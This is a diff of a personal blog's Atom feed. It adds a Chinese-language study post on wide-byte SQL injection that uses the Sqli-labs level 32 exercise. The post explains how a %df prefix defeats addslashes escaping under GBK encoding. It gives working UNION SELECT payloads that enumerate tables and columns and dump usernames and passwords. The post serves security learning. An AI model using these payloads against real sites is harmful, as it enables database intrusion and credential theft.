@@ -3,7 +3,37 @@
     <id>https://hq185187.github.io</id>
     <title>welcome to my blog • Posts by &#34;sql注入&#34; category</title>
     <link href="https://hq185187.github.io" />
-    <updated>2023-06-21T03:09:09.169Z</updated>
+    <updated>2023-06-29T10:06:07.947Z</updated>
+    <entry>
+        <id>https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/</id>
+        <title>宽字节注入学习</title>
+        <link rel="alternate" href="https://hq185187.github.io/2023/06/29/%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;h3 id=&#34;先介绍几个函数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#先介绍几个函数&#34;&gt;#&lt;/a&gt; 先介绍几个函数&lt;/h3&gt;
+&lt;ol&gt;
+&lt;li&gt;addslashes：在预定义字符（单引号，双引号，反斜杠，NULL）前加反斜杠&lt;/li&gt;
+&lt;li&gt;mysql_real_escape_string：转义 SQL 语句中使用的字符串中的特殊字符 ( &lt;code&gt;\x00,\n,\r,\,&#39;,&amp;quot;,\x1a&lt;/code&gt; )&lt;/li&gt;
+&lt;/ol&gt;
+&lt;h3 id=&#34;原理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#原理&#34;&gt;#&lt;/a&gt; 原理&lt;/h3&gt;
+&lt;p&gt;窄字节：字符大小为一个一个字节&lt;br&gt;
+宽字节：字符大小为两个字节&lt;br&gt;
+所有英文默认占一个字节，汉字占两个字节&lt;br&gt;
+常见的宽字节编码：GB2312,GBK,GB18030,BIG5,Shift_JIS&lt;/p&gt;
+&lt;p&gt;当数据库用 GBK 编码而 PHP 用 UTF-8 编码，当防止 SQL 注入的上面的函数发挥作用，在单双引号前加了反斜杠 &lt;code&gt;\&lt;/code&gt; 。假如我们在单双引号前加一个字符，使其和斜杠组合成一个汉字，从而保留单双引号，使其发挥作用。&lt;br&gt;
+注意：&lt;br&gt;
+添加的字符 ASCII 要大于 128，两个字符才能组合成汉字，因为前一个 ascii 码要大于 128，才到汉字的范围 ，这一点需要注意，经典的有 % df&lt;/p&gt;
+&lt;p&gt;例子：Sqli-labs32 关&lt;br&gt;
+输入 1‘会被转义成 &lt;code&gt;1\&#39;&lt;/code&gt; &lt;br&gt;
+ 输入 1% df’%23 就可以成功回显&lt;br&gt;
+然后就是常规的字符型注入&lt;br&gt;
+爆表：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;/?id=-1%df&amp;#x27; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=database()%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;爆列名：（这里表名要用 16 进制）&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1%df&amp;#x27; union select 1,2,group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=0x7573657273%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;爆字段：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?id=-1%df&amp;#x27; union select 1,2,group_concat(username,0x7e,password)from users%23&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+</content>
+        <updated>2023-06-29T10:06:07.947Z</updated>
+    </entry>
     <entry>
         <id>https://hq185187.github.io/2023/06/21/MySQL%E4%B8%BB%E4%BB%8E%E5%A4%8D%E5%88%B6/</id>
         <title>Mysql主从复制</title>
